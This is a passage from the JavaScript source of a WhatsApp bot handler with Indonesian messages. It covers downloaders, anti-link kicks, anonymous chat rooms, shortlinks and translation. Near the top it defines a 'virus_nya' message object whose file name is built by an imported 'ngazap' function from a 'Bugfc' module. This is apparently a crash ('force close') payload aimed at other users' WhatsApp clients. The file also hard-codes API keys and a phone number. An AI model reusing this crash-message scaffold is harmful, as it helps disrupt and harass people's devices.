"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./function/Data_Server_Bot/Console_Data')
const { removeEmojis, bytesToSize, getBuffer, fetchJson, getRandom, getGroupAdmins, runtime, sleep, makeid, isUrl, generateProfilePicture } = require("./function/func_Server");
const { addSaldo, minSaldo, cekSaldo } = require('./function/func_Deposit');
const { ngazap } = require('./function/func_Bugfc');
const { TelegraPh, UploadFileUgu, AnonFiles } = require("./function/uploader_Media");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./function/func_Addlist');
const { media_JSON, mess_JSON, setting_JSON, antilink_JSON, db_user_JSON, server_eror_JSON, welcome_JSON, db_menfes_JSON, DB_saldoUser_JSON, db_respon_list_JSON, auto_downloadTT_JSON } = require('./function/Data_Location.js')
const { mediafireDl } = require('./function/scrape_Mediafire')
const { webp2mp4File } = require("./function/Webp_Tomp4")
const { cerpen } = require('./function/Search_Cerpen')
const { bioskop, bioskopNow, latinToAksara, aksaraToLatin, gempa, gempaNow, jadwalTV, listJadwalTV, jadwalsholat} = require ('@bochilteam/scraper') 

// apinya
const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const qs = require("querystring");
const fetch = require("node-fetch");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon()

// Response
const Exif = require("./function/set_WM_Sticker")
const exif = new Exif()

const msgFilter = require("./function/func_Spam");
const { stalkff, stalkml } = require("./function/func_Stalker");

//Whm Config
let hostwhm = "" //Host server whm contoh : login.ditzzsenpai.wtf
let usrwhm = "" //username whm
let passwhm = "" //Password whm
let tokenwhm = "" // caranya => https://www.eukhost.com/kb/how-to-generate-an-api-token-using-whm/
let ipsrv = "" //ip server whm

//Biarin Jangan Di ubah
let authWhm = {headers: {Authorization: `WHM ${usrwhm}:${tokenwhm}`}}

let orang_spam = []
let medianya = []

// Database
const mess = mess_JSON
const setting = setting_JSON
const antilink = antilink_JSON
const db_user = db_user_JSON
const server_eror = server_eror_JSON
const welcomeJson = welcome_JSON
const db_menfes = db_menfes_JSON
const DB_saldoUser = DB_saldoUser_JSON
const db_respon_list = db_respon_list_JSON
const auto_downloadTT = auto_downloadTT_JSON

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(conn, msg, m, setting, store) => {
try {
let { ownerNumber, botName, smm_dana_nama, smm_dana_number } = setting
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${setting.ownerNumber}`,"6285943429237@s.whatsapp.net","6285943429237@s.whatsapp.net"].includes(sender) ? true : false
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'

// Group
const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)

const isWelcome = isGroup ? welcomeJson.includes(from) : false
const isAntiLink = antilink.includes(from) ? true : false
const isAutoDownTT = auto_downloadTT.includes(from) ? true : false

// Data But
const quoted = msg.quoted ? msg.quoted : msg
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

// IsQuoted
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
	
// mentionTag
const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

try {
var pp_user = await conn.profilePictureUrl(sender, 'image')
} catch {
var pp_user = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

const depositPath = "./transaksi/UserDeposit/"
const topupPath = "./transaksi/UserTopup/"

const virus_nya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `OHLXbot-MD ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

function monospace(string) {
return '```' + string + '```'
}

function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];	

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

const reply = (teks) => {conn.sendMessage(from, { text: teks }, { quoted: msg })}

if (isGroup && isAntiLink) {
if (!isBotGroupAdmins) return reply('Untung Bot Bukan Admin')
var linkgce = await conn.groupInviteCode(from)
if (chats.includes(`https://chat.whatsapp.com/${linkgce}`)) {
reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(chats)) {
let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isGroupAdmins) return reply(bvl)
if (fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await conn.sendMessage(from, { delete: msg.key })
mentions(`「 ANTILINK 」\n\n@${sender.split('@')[0]} Kamu mengirim link group, maaf bot akan kick kamu dari grup`, [sender])
await sleep(3000)
conn.groupParticipantsUpdate(from, [sender], "remove")
} else {
}
}

// AUTO DOWNLOAD TIKTOK
// BY OHLX BOT

if (isGroup && isAutoDownTT){
if (chats.match(/(tiktok.com)/gi)){
reply('Url tiktok terdekteksi\nWait mengecek data url.')
await sleep(3000)
var tt_res = await fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${chats}&apikey=jPHjZpQF`)
reply(`*TIKTOK DOWNLOAD*

*Author:* OHLX BOT
*Judul:* ${tt_res.result.judul}
*Source:* ${chats}

Video dan audio sedang dikirim...`)
conn.sendMessage(sender,{video:{url:tt_res.result.video.link1}, caption:'No Watermark!'}, {quotes:msg})
conn.sendMessage(sender,{audio:{url:tt_res.result.audio.link1}, mimetype:'audio/mpeg', fileName:'audio.mp3'}, {quoted:msg})
if (isGroup) return conn.sendMessage(from, {text:'Media sudah dikirim lewat chat pribadi bot.'}, {quoted:msg})
}}

// Response Addlist
if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
var get_data_respon = getDataResponList(from, chats, db_respon_list)
if (get_data_respon.isImage === false) {
conn.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
quoted: msg
})
} else {
conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: msg
})
}
}

const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

function toRupiah(angka) {
var saldonyeini = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldonyeini += angkarev.substr(i, 3) + '.';
return '' + saldonyeini.split('', saldonyeini.length - 1).reverse().join('');
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}

let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))}
}})
}

const cekPesan = (satu, dua) => { 
let x2 = false
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){x2 = i}})
if (x2 !== false) {
if (satu == "id"){ return db_menfes[x2].id }
if (satu == "teman"){ return db_menfes[x2].teman }
}
if (x2 == false) { return null } 
}

const setRoom = (satu, dua, tiga) => { 
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){
if (satu == "±id"){ db_menfes[i].id = tiga
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
if (satu == "±teman"){ db_menfes[i].teman = tiga 
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
}})
}

// auto read
conn.readMessages([msg.key])

// Menu Otomatis
if (command === 'buatroom') {
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
id: sender,
session: "buatroom",
data: {
penerima: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan tulis Nomor WhatsApp yg ingin Di ajak ngobrol*\n\n*Contoh:* 6285789004732")
} else {
reply("Kamu Sedang di dalam sesi room chat, menunggu konfirmasi dari penerima.")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "buatroom") {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_deposit.data.penerima = Number(chats);
if (data_deposit.data.penerima == sender.split('@')[0]) return reply('jangan nomor lu')
if (data_deposit.data.penerima == botNumber.split('@')[0]) return reply('itu kan nomor bot')
var cekap = await conn.onWhatsApp(chats+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${chats}\ntidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
data_deposit.session = "number_orang";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
mentions(`*BUAT ROOM CHAT*
*Pembuat:* ${sender.split('@')[0]}
*Penerima:* ${data_deposit.data.penerima}
*Status:* Room pending

*menunggu konfirmasi dari penerima.*`, [sender])
let roomC = `#${makeid(10)}`
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
var text_tersambung =`*Hallo Kak ${ucapanWaktu}*\n_Ada Permintaan Buat Room Chat_\n\n*Dari:* ${sender.split('@')[0]}\n\nSilahkan klik button ya kak jika ingin menghubungkan chat *ANONYMOUS*`
let btn_room = [{ buttonId: `${prefix}buat_room_chat ${sender}|${data_deposit.data.penerima}@s.whatsapp.net|${roomC}`, buttonText: { displayText: 'Terima️' }, type: 1 }]
var but_room = {
text: text_tersambung,
footer: 'Klik button untuk menerima chat.',
buttons: btn_room,
mentions: [sender],
headerType: 1
}
conn.sendMessage(`${data_deposit.data.penerima}@s.whatsapp.net`, but_room)
}
}
} else if (command === 'setnamabot') {
if (!isOwner) return reply(mess.OnlyOwner)
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "setnamebot",
data: {
nama_baru: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Ok siap ownerku*\n*Tulis nama bot baru ya*")
} else {
reply("nama bot nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "setnamebot") {
if (chats.length === 0) return;
data_deposit.data.nama_baru = (chats)
data_deposit.session = "nama_barunya";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SETNAMABOT SUKSES*
_*ID:* @${sender.split('@')[0]}_
_*Nama Lama:* ${setting.botName}_
_*Nama Baru:* ${data_deposit.data.nama_baru}_
_*Waktu:* ${jam} WIB_`)
await sleep(2000)
setting.botName = data_deposit.data.nama_baru
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
await sleep(2000)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'gantinama') {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "gantinama",
data: {
nama_baru: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*namalu apa? biar bot ganti*")
} else {
reply("nama nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "gantinama") {
if (chats.length === 0) return;
data_deposit.data.nama_baru = (chats)
data_deposit.session = "nama_barunya";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SETNAMA SUKSES*
_*ID:* @${sender.split('@')[0]}_
_*Nama Lama:* ${cekUser("name", sender)}_
_*Nama Baru:* ${data_deposit.data.nama_baru}_
_*Waktu:* ${jam} WIB_`)
await sleep(1000)
setUser("±name", sender, data_deposit.data.nama_baru)
await sleep(2000)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'bitly_short') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "bitly_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke bitly.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "bitly_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/bitly?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://bitly.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'tinyurl_short') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "tinyurl_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke tinyurl.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "tinyurl_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/tinyurl?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://tinyurl.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'cuttly_short') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "cuttly_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke cuttly.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "cuttly_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/cuttly?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://cutt.ly/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'translate') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "translate",
data: {
trannss: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim text yang ingin jadi translate ke inggris.*\n\n*Contoh:* Hai sayang")
} else {
reply("Text nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "translate") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)

var en = await fetchJson(`https://api.popcat.xyz/translate?to=en&text=${data_deposit.data.trannss}`) 
data_deposit.session = "input_texttttranss";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*TRANSLATE*
*IND :* ${data_deposit.data.trannss}
*EN :* ${en.translated}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'ytmp4') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "ytmp4",
data: {
url_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim Url/Link YouTube*\n\nContoh: https://youtu.be/watyplEMt90")
} else {
reply("Url YouTube nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "ytmp4") {
if (chats.length === 0) return;
data_deposit.data.url_nya = (chats)

var ytmp4 = await fetchJson(`https://saipulanuar.ga/api/download/ytmp4?url=${data_deposit.data.url_nya}&apikey=jPHjZpQF`)
var xx = ytmp4.result
if (ytmp4.status == 500) return reply('*Link yg kamu berikan tidak valid*\n*Silahkan kirim url yg valid&benar*')
data_deposit.session = "input_urlytmp4";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*YTMP4 DOWNLOAD*

*title:* ${xx.title}
*channel:* ${xx.channel}
*published:* ${xx.published}
*views:* ${xx.views}
*type:* video/mp4

_Sedang mengirim video.._`)
conn.sendMessage(sender, {video:{url:xx.url}, caption:'Done!'}, {quoted:msg})
if (isGroup) return conn.sendMessage(from, {text:'Video sudah dikirim lewat chat pribadi bot.'}, {quoted:msg})
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'ytmp3') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "ytmp3",
data: {
url_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim Url/Link YouTube*\n\nContoh: https://youtu.be/watyplEMt90")
} else {
reply("Url YouTube nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "ytmp3") {
if (chats.length === 0) return;
data_deposit.data.url_nya = (chats);
var ytmp3 = await fetchJson(`https://saipulanuar.ga/api/download/ytmp3?url=${data_deposit.data.url_nya}&apikey=jPHjZpQF`)
var xx = ytmp3.result
if (ytmp3.status == 500) return reply('*Link yg kamu berikan tidak valid*\n*Silahkan kirim url yg valid&benar*')
data_deposit.session = "input_urlytmp3";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*YTMP3 DOWNLOAD*

*title:* ${xx.title}
*channel:* ${xx.channel}
*published:* ${xx.published}
*views:* ${xx.views}
*type:* audio/mp3

_Sedang mengirim audio..._`)
conn.sendMessage(sender, {audio:{url:xx.url}, mimetype:'audio/mpeg', fileName: `${xx.title}.mp3`}, {quoted:msg})
if (isGroup) return conn.sendMessage(from, {text:'Audio sudah dikirim lewat chat pribadi bot.'}, {quoted:msg})
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'stalknpm') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "stalknpm",
data: {
id_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim Username Npm*\n*Contoh:* hikki-me")
} else {
reply("Username npmnya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "stalknpm") {
data_deposit.data.id_nya = (chats)

var x = await fetchJson(`https://api.popcat.xyz/npm?q=${data_deposit.data.id_nya}`)
if (x.error) return reply('Username tidak ditemukan\nSilahkan kirim username Npm yg benar.')
data_deposit.session = "use_npmstalk";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
var npm_text =`*NPM STALKER*
name : ${x.name}
version : ${x.version}
description : ${x.description}
author : ${x.author}
author_email : ${x.author_email}
last_published : ${x.last_published}
maintainers : ${x.maintainers}
repository : ${x.repository}

keywords : ${x.keywords}`
reply(npm_text)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'stalkgithub') {
